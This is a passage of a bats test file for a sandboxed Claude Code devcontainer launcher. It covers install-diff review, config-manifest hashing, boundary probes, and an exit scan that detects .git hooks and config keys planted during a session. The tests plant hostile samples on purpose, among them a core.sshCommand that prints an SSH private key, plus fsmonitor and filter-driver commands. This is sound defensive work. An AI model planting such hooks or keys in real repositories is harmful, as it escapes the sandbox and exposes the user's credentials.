  for f in devcontainer.json Dockerfile init-firewall.sh cc-sni-proxy.py cc-isolated.sh cc-exit-scan.sh cc-gitdir.sh cc-push.sh link-claude-home.sh egress; do
    cp -r "$cfg/$f" "$dest/$f"
  done
  printf '%s\n' "$dest"
}

@test "install.sh review diff shows the CONTENT of a new file inside a payload dir" {
  # Regression (audit 2026-09-18, D1): `diff -ru` printed only
  # "Only in .../egress: newprof.txt", so the reviewer approved a new egress
  # profile whose hostnames they never saw.
  root=$(fake_install_repo)
  dest=$(fake_payload_and_dest "$root")
  printf 'evil.example.com\n' > "$root/devcontainer-config/egress/newprof.txt"; fake_commit "$root"
  run env CLAUDE_DEVC_CONFIG_DIR="$dest" \
      bash "$root/devcontainer-config/install.sh" </dev/null
  [[ "$output" == *'+evil.example.com'* ]]
  [[ "$output" == *'bless it?'* ]]
}

@test "install.sh review diff shows a new top-level payload item, not nothing" {
  # Regression (D1): a PAYLOAD item absent from the install dir made diff exit 2
  # with its only output on the discarded stderr — the item was invisible.
  # claude-home is such an item on the first install after it was added.
  root=$(fake_install_repo)
  dest=$(fake_payload_and_dest "$root")
  printf 'hidden-hook-body\n' > "$root/hooks/new-hook.sh"; fake_commit "$root"
  run env CLAUDE_DEVC_CONFIG_DIR="$dest" \
      bash "$root/devcontainer-config/install.sh" </dev/null
  [[ "$output" == *'+hidden-hook-body'* ]]
  [[ "$output" != *'(none'* ]]
}

@test "install.sh aborts before the prompt when the review diff itself fails" {
  # A diff that errors (here: a payload item that is a file on one side and a
  # directory on the other) cannot be reviewed, so it must not reach [y/N].
  # Stdin stays closed so even the pre-fix code declines rather than installing.
  root=$(fake_install_repo)
  dest=$(fake_payload_and_dest "$root")
  rm -rf "$dest/egress"; printf 'not a dir\n' > "$dest/egress"
  run env CLAUDE_DEVC_CONFIG_DIR="$dest" \
      bash "$root/devcontainer-config/install.sh" </dev/null
  [ "$status" -eq 1 ]
  [[ "$output" == *"could not diff payload item 'egress'"* ]]
  [[ "$output" != *'bless it?'* ]]
}

@test "link-claude-home refuses to clobber a real file in the volume" {
  src="$BATS_TEST_TMPDIR/payload"; dst="$BATS_TEST_TMPDIR/dest"
  mkdir -p "$src/skills" "$dst"
  printf 'user-owned\n' > "$dst/skills"
  CC_WORKFLOWS_DIR="$src" CLAUDE_CONFIG_DIR="$dst" run bash "$CONFIG_SRC/link-claude-home.sh"
  [ "$status" -eq 0 ]
  [ "$(cat "$dst/skills")" = "user-owned" ]
}

@test "link-claude-home links the payload and is idempotent" {
  src="$BATS_TEST_TMPDIR/p2"; dst="$BATS_TEST_TMPDIR/d2"
  mkdir -p "$src/skills" "$dst"
  CC_WORKFLOWS_DIR="$src" CLAUDE_CONFIG_DIR="$dst" bash "$CONFIG_SRC/link-claude-home.sh"
  CC_WORKFLOWS_DIR="$src" CLAUDE_CONFIG_DIR="$dst" run bash "$CONFIG_SRC/link-claude-home.sh"
  [ "$status" -eq 0 ]
  [ -L "$dst/skills" ]
  [ "$(readlink "$dst/skills")" = "$src/skills" ]
}

@test "link-claude-home is a no-op when the payload is absent (non-cc-isolated host)" {
  dst="$BATS_TEST_TMPDIR/d3"; mkdir -p "$dst"
  CC_WORKFLOWS_DIR="$BATS_TEST_TMPDIR/nope" CLAUDE_CONFIG_DIR="$dst" run bash "$CONFIG_SRC/link-claude-home.sh"
  [ "$status" -eq 0 ]
  [[ "$output" == *"no payload at $BATS_TEST_TMPDIR/nope"*"skipping"* ]]
  # Nothing linked or created: a missing guard would plant dangling links here.
  [ -z "$(ls -A "$dst")" ]
}

@test "Gate 1h loads the review skill from the baked payload, not the branch" {
  run grep -E 'CR_SKILL="/opt/claude-workflows/skills/code-review/SKILL.md"' "$BATS_TEST_DIRNAME/../scripts/self-improvement.sh"
  [ "$status" -eq 0 ]
}

@test "Gate 1h pins an explicit reviewer model" {
  run grep -E 'SI_CODE_REVIEW_MODEL="\$\{SI_CODE_REVIEW_MODEL:-opus\}"' "$BATS_TEST_DIRNAME/../scripts/self-improvement.sh"
  [ "$status" -eq 0 ]
  # Tolerate anything between `claude -p` and the model pin: 96166d5 inserted the
  # headless flags array there. The invariant under test is the model pin, not the
  # argument order.
  run grep -E 'claude -p .*--model "\$SI_CODE_REVIEW_MODEL"' "$BATS_TEST_DIRNAME/../scripts/self-improvement.sh"
  [ "$status" -eq 0 ]
}

@test "Gate 1h archives review artifacts before the worktree is torn down" {
  run grep -E 'cp -f "\$WT_DIR"/docs/reviews/\*\.md "\$CR_ARCHIVE/"' "$BATS_TEST_DIRNAME/../scripts/self-improvement.sh"
  [ "$status" -eq 0 ]
  # Must be outside the worktree, or `git worktree remove --force` eats it.
  run grep -E 'CR_ARCHIVE="\$WORKING_DIR/reviews/' "$BATS_TEST_DIRNAME/../scripts/self-improvement.sh"
  [ "$status" -eq 0 ]
}

@test "Gate 1h fails closed on reviewer error and on an unparseable verdict" {
  run grep -E 'REJECT_REASON="code-review: reviewer exited' "$BATS_TEST_DIRNAME/../scripts/self-improvement.sh"
  [ "$status" -eq 0 ]
  run grep -E 'REJECT_REASON="code-review: no parseable verdict' "$BATS_TEST_DIRNAME/../scripts/self-improvement.sh"
  [ "$status" -eq 0 ]
  # The old fail-open swallow must be gone from the reviewer invocation.
  run grep -E 'Do not count amber or green rows\." 2>&1\) \|\| true' "$BATS_TEST_DIRNAME/../scripts/self-improvement.sh"
  # 1 = no match; 2 (file unreadable) must not pass as "absent".
  [ "$status" -eq 1 ]
}

@test "Gate 1h passes a per-run nonce the branch cannot know" {
  run grep -E 'CR_NONCE=\$\(od -An -tx1 -N8 /dev/urandom' "$BATS_TEST_DIRNAME/../scripts/self-improvement.sh"
  [ "$status" -eq 0 ]
  run grep -E 'CODE_REVIEW_RED\[\$CR_NONCE\]:' "$BATS_TEST_DIRNAME/../scripts/self-improvement.sh"
  [ "$status" -eq 0 ]
  run grep -E 'parse_code_review_red "\$CR_NONCE"' "$BATS_TEST_DIRNAME/../scripts/self-improvement.sh"
  [ "$status" -eq 0 ]
}

@test "every regular file in install.sh's PAYLOAD is hashed by enforcement_files" {
  # REGRESSION: cc-sni-proxy.py shipped in neither list, then in only one. The two
  # lists are hand-maintained; this pins them together. Directories (egress,
  # claude-home) are covered by globs or deliberately excluded (see the comment
  # above enforcement_files).
  local payload_line items item copied
  payload_line="$(grep -m1 '^PAYLOAD=(' "$CONFIG_SRC/install.sh")"
  [[ "$payload_line" == *")" ]] || { echo "PAYLOAD spans lines; update this test"; return 1; }
  items="${payload_line#PAYLOAD=(}"; items="${items%)}"
  run enforcement_files
  for item in $items; do
    case "$item" in
      egress|claude-home) continue ;;   # covered by the glob / sorted walk below
    esac
    echo "$output" | grep -qx "$item" || { echo "PAYLOAD item not hashed: $item"; return 1; }
  done
  # The other direction F1 broke on: every Dockerfile COPY source must be in PAYLOAD.
  while read -r copied; do
    copied="${copied%/}"
    case " $items " in *" $copied "*) ;; *) echo "Dockerfile COPYs $copied but PAYLOAD lacks it"; return 1 ;; esac
  done < <(grep -E '^COPY ' "$CONFIG_SRC/Dockerfile" | awk '{print $2}')
}

@test "claude-home files are hashed file by file when present" {
  mkdir -p "$CLAUDE_DEVC_CONFIG_DIR/claude-home/hooks"
  echo 'echo hi' > "$CLAUDE_DEVC_CONFIG_DIR/claude-home/hooks/h.sh"
  run compute_manifest
  [ "$status" -eq 0 ]
  echo "$output" | grep -q 'claude-home/hooks/h.sh'
  bless_manifest >/dev/null
  echo 'echo bye' > "$CLAUDE_DEVC_CONFIG_DIR/claude-home/hooks/h.sh"
  run check_manifest
  [ "$status" -ne 0 ]
}

@test "compute_manifest covers claude-home even when projects/ is empty, under errexit" {
  # REGRESSION: an empty projects/ glob made the enforcement_files subshell exit 1
  # under set -e + pipefail before the claude-home walk — the fresh-install state
  # blessed none of the baked payload. Run through a real errexit shell, not `run`.
  mkdir -p "$CLAUDE_DEVC_CONFIG_DIR/projects" "$CLAUDE_DEVC_CONFIG_DIR/claude-home/skills"
  echo 'x' > "$CLAUDE_DEVC_CONFIG_DIR/claude-home/skills/s.md"
  out="$(bash -euo pipefail -c 'source "$1"; compute_manifest' _ "$CONFIG_SRC/cc-isolated.sh")"
  echo "$out" | grep -q 'claude-home/skills/s.md'
}

@test "a symlink in claude-home is blessed by its target and a repoint trips the manifest" {
  mkdir -p "$CLAUDE_DEVC_CONFIG_DIR/claude-home"
  ln -s /nonexistent/a "$CLAUDE_DEVC_CONFIG_DIR/claude-home/link"
  run compute_manifest
  [ "$status" -eq 0 ]
  echo "$output" | grep -q 'claude-home/link'
  bless_manifest >/dev/null
  ln -sfn /nonexistent/b "$CLAUDE_DEVC_CONFIG_DIR/claude-home/link"
  run check_manifest
  [ "$status" -ne 0 ]
}

@test "a symlinked enforcement file is hashed by content as well as by target" {
  # REGRESSION: hashing links by target text only meant a symlinked
  # devcontainer.json whose target was rewritten left the manifest unchanged.
  mv "$CLAUDE_DEVC_CONFIG_DIR/devcontainer.json" "$CLAUDE_DEVC_CONFIG_DIR/real.json"
  ln -s real.json "$CLAUDE_DEVC_CONFIG_DIR/devcontainer.json"
  bless_manifest >/dev/null
  run check_manifest
  [ "$status" -eq 0 ]
  echo '{"name":"changed"}' > "$CLAUDE_DEVC_CONFIG_DIR/real.json"
  run check_manifest
  [ "$status" -ne 0 ]
}

@test "compute_manifest fails when enforcement_files fails" {
  enforcement_files() { echo "devcontainer.json"; return 1; }
  run compute_manifest
  [ "$status" -ne 0 ]
  [[ "$output" == *"enforcement_files failed"* ]]
}

# --- blessed ≠ verified: the live-verification receipt (decision log #45) ---
#
# A bless hashes files; it cannot know whether a container built from them works
# (two boundary changes shipped blessed-but-unverified and cost a six-day outage,
# #44). The launcher therefore bakes the blessed hash into the image, and only a
# passing self-probe against a container carrying THAT hash writes the receipt.

# A devcontainer stub that answers the in-container reads probe_boundary makes.
# STUB_IMAGE_HASH → /etc/cc-config-hash; STUB_FP → the workspace fingerprint;
# STUB_FW_MISSING=1 → the firewall completion marker is absent. Every call is
# logged to $DC_LOG so main()'s rebuild decision can be asserted.
smart_devcontainer_stub() {
  export DC_LOG="$TEST_TMPDIR/dc.log"
  cat > "$TEST_TMPDIR/bin/devcontainer" <<'STUB'
#!/usr/bin/env bash
echo "devcontainer $*" >> "$DC_LOG"
# Record the environment `up` sees: devcontainer.json's ${localEnv:...} reads it.
if [ "$1" = up ]; then env > "$DC_LOG.up-env"; fi
case "$*" in
  *cc-config-hash*)        printf '%s\n' "${STUB_IMAGE_HASH:-}" ;;
  *rev-parse*)             printf '%s' "${STUB_FP:-}" ;;
  *cc-firewall/complete*)  [ -z "${STUB_FW_MISSING:-}" ] ;;
  *cc-project-id*)
    # H6 emulation (opt-in via STUB_CLAUDE_DIR): really run the probe's script,
    # with /home/node/.claude redirected to a test dir and the container's
    # CC_PROJECT_ID set from STUB_CTR_PID, so the check's logic is exercised.
    [ -n "${STUB_CLAUDE_DIR:-}" ] || exit 0
    while [ $# -gt 0 ] && [ "$1" != bash ]; do shift; done
    shift 2; script="$1"; shift
    CC_PROJECT_ID="${STUB_CTR_PID:-}" \
      bash -c "${script//\/home\/node\/.claude/$STUB_CLAUDE_DIR}" "$@" ;;
  *)                       exit 0 ;;
esac
STUB
  chmod +x "$TEST_TMPDIR/bin/devcontainer"
}

# Run probe_boundary against a stubbed container whose ~/.claude volume lives in
# $STUB_CLAUDE_DIR and whose containerEnv CC_PROJECT_ID is $1 (may be empty).
h6_probe() {
  [ -d "$TEST_TMPDIR/proj/.git" ] || make_repo "$TEST_TMPDIR/proj"
  bless_manifest >/dev/null
  smart_devcontainer_stub
  CC_CONFIG_HASH="$(blessed_hash)"
  STUB_IMAGE_HASH="$(blessed_hash)"
  STUB_FP="$(ws_fingerprint "$TEST_TMPDIR/proj")"
  STUB_CLAUDE_DIR="$TEST_TMPDIR/claudevol"
  STUB_CTR_PID="$1"
  mkdir -p "$STUB_CLAUDE_DIR"
  export CC_CONFIG_HASH STUB_IMAGE_HASH STUB_FP STUB_CLAUDE_DIR STUB_CTR_PID
}

# Regression (audit 2026-09-18, D2): H6 compared the volume stamp against the
# container's OWN $CC_PROJECT_ID, so an empty or wrong containerEnv agreed with
# itself and passed.

@test "H6 passes and stamps the host's project id on a correct container" {
  make_repo "$TEST_TMPDIR/proj"
  h6_probe "$(project_id "$TEST_TMPDIR/proj")"
  run probe_boundary "$TEST_TMPDIR/proj" "$TEST_TMPDIR/nohome"
  [ "$status" -eq 0 ]
  [ "$(cat "$STUB_CLAUDE_DIR/.cc-project-id")" = "$(project_id "$TEST_TMPDIR/proj")" ]
}

@test "H6 fails when the container's CC_PROJECT_ID is empty (no empty stamp)" {
  h6_probe ""
  run probe_boundary "$TEST_TMPDIR/proj" "$TEST_TMPDIR/nohome"
  [ "$status" -ne 0 ]
  [[ "$output" == *"PROBE FAIL (H6)"* ]]
  [ ! -e "$STUB_CLAUDE_DIR/.cc-project-id" ]
  [ ! -f "$(verified_path)" ]
}

@test "H6 fails on a volume stamped for another project even if the container agrees with it" {
  h6_probe "otherproject0000"
  printf '%s' "otherproject0000" > "$STUB_CLAUDE_DIR/.cc-project-id"
  run probe_boundary "$TEST_TMPDIR/proj" "$TEST_TMPDIR/nohome"
  [ "$status" -ne 0 ]
  [[ "$output" == *"PROBE FAIL (H6)"* ]]
}

@test "H6 fails on an empty stamp left by an earlier empty-env run" {
  make_repo "$TEST_TMPDIR/proj"
  h6_probe "$(project_id "$TEST_TMPDIR/proj")"
  : > "$STUB_CLAUDE_DIR/.cc-project-id"
  run probe_boundary "$TEST_TMPDIR/proj" "$TEST_TMPDIR/nohome"
  [ "$status" -ne 0 ]
  [[ "$output" == *"PROBE FAIL (H6)"* ]]
}

@test "blessed_hash needs a manifest, is stable, and changes when the boundary changes" {
  run blessed_hash
  [ "$status" -ne 0 ]
  bless_manifest >/dev/null
  local h1 h2 h3
  h1="$(blessed_hash)"; h2="$(blessed_hash)"
  [ "$h1" = "$h2" ]
  [ "${#h1}" -eq 16 ]
  echo 'more.example' >> "$CLAUDE_DEVC_CONFIG_DIR/egress/base.txt"
  bless_manifest >/dev/null
  h3="$(blessed_hash)"
  [ "$h3" != "$h1" ]
}

@test "a fresh bless is NOT verified live, and says so" {
  run bless_manifest
  [ "$status" -eq 0 ]
  [[ "$output" == *"Verified live:  NO"* ]]
  [[ "$output" == *"--probe-only"* ]]
  [[ "$output" == *"Live-verified:"* ]]
  run is_verified_live
  [ "$status" -ne 0 ]
  [ ! -f "$(verified_path)" ]
}

@test "the receipt names the blessed hash and is void once the boundary changes" {
  bless_manifest >/dev/null
  record_verified_live
  [ "$(cat "$(verified_path)")" = "$(blessed_hash)" ]
  run is_verified_live
  [ "$status" -eq 0 ]
  run bless_manifest            # same content re-blessed: still verified
  [[ "$output" == *"Verified live:  yes"* ]]
  echo 'more.example' >> "$CLAUDE_DEVC_CONFIG_DIR/egress/base.txt"
  bless_manifest >/dev/null
  run is_verified_live
  [ "$status" -ne 0 ]
}

@test "--list reports the blessed hash and its verification state" {
  bless_manifest >/dev/null
  run list_projects
  [[ "$output" == *"Blessed config $(blessed_hash) — verified live: NO"* ]]
  record_verified_live
  run list_projects
  [[ "$output" == *"verified live: yes"* ]]
}

@test "devcontainer.json passes CC_CONFIG_HASH as a build arg and the Dockerfile bakes it last" {
  run grep -c '"CC_CONFIG_HASH": "${localEnv:CC_CONFIG_HASH}"' "$CONFIG_SRC/devcontainer.json"
  [ "$output" -eq 1 ]
  grep -q '^ARG CC_CONFIG_HASH=""' "$CONFIG_SRC/Dockerfile"
  grep -q '"${CC_CONFIG_HASH}" > /etc/cc-config-hash' "$CONFIG_SRC/Dockerfile"
  # The ARG must sit in the per-project tail (after CC_EGRESS_PROFILE) so every
  # shared layer stays shared across blesses.
  local a b
  a=$(grep -n '^ARG CC_EGRESS_PROFILE' "$CONFIG_SRC/Dockerfile" | cut -d: -f1)
  b=$(grep -n '^ARG CC_CONFIG_HASH' "$CONFIG_SRC/Dockerfile" | cut -d: -f1)
  [ "$a" -lt "$b" ]
  # An `export` statement naming it, not the bare assignment (see the
  # CC_CONFIG_DIR test); the launch test below checks the value devcontainer sees.
  grep -Eq '^\s*export( [A-Z_]+)* CC_CONFIG_HASH( |$)' "$CONFIG_SRC/cc-isolated.sh"
}

@test "probe_boundary passes and writes the receipt when the container carries the blessed hash" {
  make_repo "$TEST_TMPDIR/proj"
  bless_manifest >/dev/null
  smart_devcontainer_stub
  CC_CONFIG_HASH="$(blessed_hash)"
  STUB_IMAGE_HASH="$(blessed_hash)"
  STUB_FP="$(ws_fingerprint "$TEST_TMPDIR/proj")"
  export CC_CONFIG_HASH STUB_IMAGE_HASH STUB_FP
  run probe_boundary "$TEST_TMPDIR/proj" "$TEST_TMPDIR/nohome"
  [ "$status" -eq 0 ]
  [[ "$output" == *"firewall complete"* ]]
  [ "$(cat "$(verified_path)")" = "$(blessed_hash)" ]
}

@test "probe_boundary fails on a container built from another config, and writes no receipt" {
  make_repo "$TEST_TMPDIR/proj"
  bless_manifest >/dev/null
  smart_devcontainer_stub
  CC_CONFIG_HASH="$(blessed_hash)"
  STUB_IMAGE_HASH="0000000000000000"
  STUB_FP="$(ws_fingerprint "$TEST_TMPDIR/proj")"
  export CC_CONFIG_HASH STUB_IMAGE_HASH STUB_FP
  run probe_boundary "$TEST_TMPDIR/proj" "$TEST_TMPDIR/nohome"
  [ "$status" -ne 0 ]
  [[ "$output" == *"PROBE FAIL (config identity)"* ]]
  [[ "$output" == *"--remove-existing-container"* ]]
  [ ! -f "$(verified_path)" ]
}

@test "probe_boundary fails when init-firewall.sh never completed (closed ≠ verified)" {
  make_repo "$TEST_TMPDIR/proj"
  bless_manifest >/dev/null
  smart_devcontainer_stub
  CC_CONFIG_HASH="$(blessed_hash)"
  STUB_IMAGE_HASH="$(blessed_hash)"
  STUB_FP="$(ws_fingerprint "$TEST_TMPDIR/proj")"
  STUB_FW_MISSING=1
  export CC_CONFIG_HASH STUB_IMAGE_HASH STUB_FP STUB_FW_MISSING
  run probe_boundary "$TEST_TMPDIR/proj" "$TEST_TMPDIR/nohome"
  [ "$status" -ne 0 ]
  [[ "$output" == *"PROBE FAIL (firewall)"* ]]
  [ ! -f "$(verified_path)" ]
}

@test "a launch rebuilds a container whose baked config is not the blessed one" {
  make_repo "$TEST_TMPDIR/proj"
  bless_manifest >/dev/null
  smart_devcontainer_stub
  # First `cat /etc/cc-config-hash` answers with a stale hash; the stub cannot
  # change state, so the launch's later reads also see it and the probe fails —
  # what is asserted is the rebuild decision, not the session start.
  STUB_IMAGE_HASH="0000000000000000"
  STUB_FP="$(ws_fingerprint "$TEST_TMPDIR/proj")"
  export STUB_IMAGE_HASH STUB_FP
  run bash "$CONFIG_SRC/cc-isolated.sh" "$TEST_TMPDIR/proj"
  [[ "$output" == *"has NOT been verified in a live container"* ]]
  [[ "$output" == *"Blessed config changed since this container was built"* ]]
  grep -q '^devcontainer up --remove-existing-container ' "$DC_LOG"
}

@test "a launch on a matching, verified container does not rebuild" {
  make_repo "$TEST_TMPDIR/proj"
  bless_manifest >/dev/null
  smart_devcontainer_stub
  STUB_IMAGE_HASH="$(blessed_hash)"
  STUB_FP="$(ws_fingerprint "$TEST_TMPDIR/proj")"
  export STUB_IMAGE_HASH STUB_FP
  # Inherited values (e.g. running inside a cc-isolated container) would stay
  # exported through a bare assignment and mask a dropped `export`.
  unset CC_PROJECT_ID CC_PROJECT_NAME CC_CONFIG_DIR CC_CONFIG_HASH
  run bash "$CONFIG_SRC/cc-isolated.sh" "$TEST_TMPDIR/proj"
  [ "$status" -eq 0 ]
  # `run !`, not a bare `!`: a leading `!` on a non-final command does not fail a
  # bats test, so the bare form asserted nothing (SC2314).
  run ! grep -q -- '--remove-existing-container' "$DC_LOG"
  grep -q '^devcontainer exec .* claude$' "$DC_LOG"
  [ "$(cat "$(verified_path)")" = "$(blessed_hash)" ]
  # devcontainer.json's ${localEnv:...} build paths and args need these EXPORTED.
  local ws; ws="$(git -C "$TEST_TMPDIR/proj" rev-parse --show-toplevel)"
  grep -qxF "CC_CONFIG_DIR=$CLAUDE_DEVC_CONFIG_DIR" "$DC_LOG.up-env"
  grep -qxF "CC_CONFIG_HASH=$(blessed_hash)" "$DC_LOG.up-env"
  grep -qxF "CC_PROJECT_ID=$(project_id "$ws")" "$DC_LOG.up-env"
  grep -qxF "CC_PROJECT_NAME=proj" "$DC_LOG.up-env"
}

@test "--probe-only always rebuilds before probing" {
  make_repo "$TEST_TMPDIR/proj"
  bless_manifest >/dev/null
  smart_devcontainer_stub
  STUB_IMAGE_HASH="$(blessed_hash)"
  STUB_FP="$(ws_fingerprint "$TEST_TMPDIR/proj")"
  export STUB_IMAGE_HASH STUB_FP
  run bash "$CONFIG_SRC/cc-isolated.sh" --probe-only "$TEST_TMPDIR/proj"
  [ "$status" -eq 0 ]
  grep -q '^devcontainer up --remove-existing-container ' "$DC_LOG"
  ! grep -q ' claude$' "$DC_LOG"
}

# --- Exit scan: .git changes made during the session (Q-069 [3], Q-076) ---------
# Each planted command touches a marker under $TEST_TMPDIR/ran; the scan must name
# the item AND leave no marker, since it may run nothing from the container's .git.

scan_repo() {
  make_repo "$TEST_TMPDIR/proj"
  SCAN_WS="$(git -C "$TEST_TMPDIR/proj" rev-parse --show-toplevel)"
  mkdir -p "$TEST_TMPDIR/ran"
}

# plant_hook <dir> <name>: an executable hook that leaves a marker if run.
plant_hook() {
  mkdir -p "$1"
  printf '#!/bin/sh\ntouch %s/ran/hook-%s\n' "$TEST_TMPDIR" "$2" > "$1/$2"
  chmod +x "$1/$2"
}

@test "exit scan: a clean session is silent and returns 0" {
  scan_repo
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  echo change > "$SCAN_WS/file.txt"
  git -C "$SCAN_WS" -c commit.gpgsign=false commit -qam "session work"
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 0 ]
  [ -z "$output" ]
}

@test "exit scan: snapshots that differ with nothing to show fail closed (status 2), never 0" {
  scan_repo
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  plant_hook "$SCAN_WS/.git/hooks" pre-push
  # Stand-in for a file that changed while the scan read it: the snapshots
  # differ, but the rendered difference comes out empty.
  scan_diff() { :; }
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 2 ]
  [[ "$output" == *"could not be shown"* ]]
}

@test "exit scan: a hook planted in .git/hooks is named, and not run" {
  scan_repo
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  plant_hook "$SCAN_WS/.git/hooks" pre-push
  cd "$SCAN_WS"   # the launcher's cwd is often the repo itself
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"+ hook $SCAN_WS/.git/hooks/pre-push  file 755 "* ]]
  [[ "$output" == *"core.hooksPath=/dev/null"* ]]
  [ -z "$(ls -A "$TEST_TMPDIR/ran")" ]
}

@test "exit scan: a *.sample hook is ignored (git never runs one)" {
  scan_repo
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  plant_hook "$SCAN_WS/.git/hooks" pre-push.sample
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 0 ]
}

@test "exit scan: a planted core.hooksPath and a hook in it are both named" {
  scan_repo
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  plant_hook "$SCAN_WS/.evil-hooks" post-checkout
  git config --file "$SCAN_WS/.git/config" core.hooksPath .evil-hooks
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"core.hookspath .evil-hooks"* ]]
  [[ "$output" == *"hook $SCAN_WS/.evil-hooks/post-checkout "* ]]
}

@test "exit scan: a planted core.fsmonitor is named, and not run" {
  scan_repo
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  git config --file "$SCAN_WS/.git/config" core.fsmonitor "touch $TEST_TMPDIR/ran/fsmonitor"
  cd "$SCAN_WS"
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"~ config $SCAN_WS/.git/config  file "* ]]
  [[ "$output" == *"+ core.fsmonitor touch $TEST_TMPDIR/ran/fsmonitor   <- can run a program"* ]]
  [ -z "$(ls -A "$TEST_TMPDIR/ran")" ]
}

@test "exit scan: a planted filter driver is named, and not run" {
  scan_repo
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  git config --file "$SCAN_WS/.git/config" filter.x.clean "touch $TEST_TMPDIR/ran/clean"
  git config --file "$SCAN_WS/.git/config" filter.x.smudge "touch $TEST_TMPDIR/ran/smudge"
  mkdir -p "$SCAN_WS/.git/info"
  echo '* filter=x' > "$SCAN_WS/.git/info/attributes"
  cd "$SCAN_WS"
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"filter.x.clean touch "* ]]
  [[ "$output" == *"filter.x.smudge touch "* ]]
  [[ "$output" == *"attributes $SCAN_WS/.git/info/attributes "* ]]
  [ -z "$(ls -A "$TEST_TMPDIR/ran")" ]
}

@test "exit scan: planted include and includeIf keys are named; the target is read, not run" {
  scan_repo
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  # The included file itself plants an fsmonitor; following the include would
  # hide where the key came from.
  printf '[core]\n\tfsmonitor = touch %s/ran/included\n' "$TEST_TMPDIR" > "$TEST_TMPDIR/inc.cfg"
  git config --file "$SCAN_WS/.git/config" include.path "$TEST_TMPDIR/inc.cfg"
  git config --file "$SCAN_WS/.git/config" "includeIf.gitdir:/.path" "$TEST_TMPDIR/inc.cfg"
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"include.path $TEST_TMPDIR/inc.cfg"* ]]
  [[ "$output" == *"includeif.gitdir:/.path $TEST_TMPDIR/inc.cfg"* ]]
  # The target is read (and its entries shown), never passed to git as config.
  [[ "$output" == *"+ include $TEST_TMPDIR/inc.cfg  file "* ]]
  [[ "$output" == *"+ core.fsmonitor touch $TEST_TMPDIR/ran/included"* ]]
  [ -z "$(ls -A "$TEST_TMPDIR/ran")" ]
}

@test "exit scan: a planted core.sshCommand (what host git push runs) is named" {
  scan_repo
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  git config --file "$SCAN_WS/.git/config" core.sshCommand "sh -c 'cat ~/.ssh/id_ed25519'"
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"core.sshcommand sh -c"* ]]
}

@test "exit scan: items present at launch are baseline, not findings" {
  scan_repo
  plant_hook "$SCAN_WS/.git/hooks" pre-commit
  git config --file "$SCAN_WS/.git/config" filter.lfs.smudge "git-lfs smudge -- %f"
  git config --file "$SCAN_WS/.git/config" core.fsmonitor true
  git config --file "$SCAN_WS/.git/config" include.path "$TEST_TMPDIR/inc.cfg"
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 0 ]
  [ -z "$output" ]
}

@test "exit scan: a pre-existing hook or key that CHANGED is a finding" {
  scan_repo
  plant_hook "$SCAN_WS/.git/hooks" pre-commit
  git config --file "$SCAN_WS/.git/config" filter.lfs.smudge "git-lfs smudge -- %f"
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  echo 'true' >> "$SCAN_WS/.git/hooks/pre-commit"
  git config --file "$SCAN_WS/.git/config" filter.lfs.smudge "sh -c evil"
  run git_exit_scan "$SCAN_WS" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"hook $SCAN_WS/.git/hooks/pre-commit "* ]]
  [[ "$output" == *"filter.lfs.smudge sh -c evil"* ]]
  [[ "$output" == *"- filter.lfs.smudge git-lfs smudge -- %f"* ]]
}

@test "exit scan: a linked worktree is scanned through its commondir, config.worktree included" {
  scan_repo
  git -C "$SCAN_WS" worktree add -q "$TEST_TMPDIR/wt" -b wt
  local wt; wt="$(git -C "$TEST_TMPDIR/wt" rev-parse --show-toplevel)"
  local before; before="$(git_exec_snapshot "$wt")"
  plant_hook "$SCAN_WS/.git/hooks" pre-push
  git config --file "$SCAN_WS/.git/worktrees/wt/config.worktree" core.fsmonitor "touch x"
  run git_exit_scan "$wt" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"hook $SCAN_WS/.git/hooks/pre-push "* ]]
  [[ "$output" == *"+ config $SCAN_WS/.git/worktrees/wt/config.worktree  file "* ]]
  [[ "$output" == *"+ core.fsmonitor touch x"* ]]
}

@test "exit scan: a repointed .git file is a finding" {
  scan_repo
  git -C "$SCAN_WS" worktree add -q "$TEST_TMPDIR/wt" -b wt
  local wt; wt="$(git -C "$TEST_TMPDIR/wt" rev-parse --show-toplevel)"
  local before; before="$(git_exec_snapshot "$wt")"
  make_repo "$TEST_TMPDIR/other"
  echo "gitdir: $TEST_TMPDIR/other/.git" > "$wt/.git"
  run git_exit_scan "$wt" "$before"
  [ "$status" -eq 1 ]
  [[ "$output" == *"~ gitdir $wt/.git  $TEST_TMPDIR/other/.git"* ]]
}

# --- Git-directory validity (cc-gitdir.sh): with .git not a git dir git accepts,
# git's discovery falls back to the checkout root as a bare repository.

@test "exit scan gitdir: a .git made invalid (HEAD removed) during the session is a finding" {
  scan_repo
  local before; before="$(git_exec_snapshot "$SCAN_WS")"
  rm "$SCAN_WS/.git/HEAD"
  run git_exit_scan "$SCAN_WS" "$before"
  echo "$output"
  [ "$status" -eq 1 ]
  [[ "$output" == *"~ gitdir-valid $SCAN_WS/.git  invalid HEAD=invalid"* ]]
  [[ "$output" == *"! $SCAN_WS/.git is not a valid git directory now"* ]]
}

@test "exit scan gitdir: a .git invalid at launch is still a finding at exit" {
  scan_repo
  echo garbage > "$SCAN_WS/.git/HEAD"
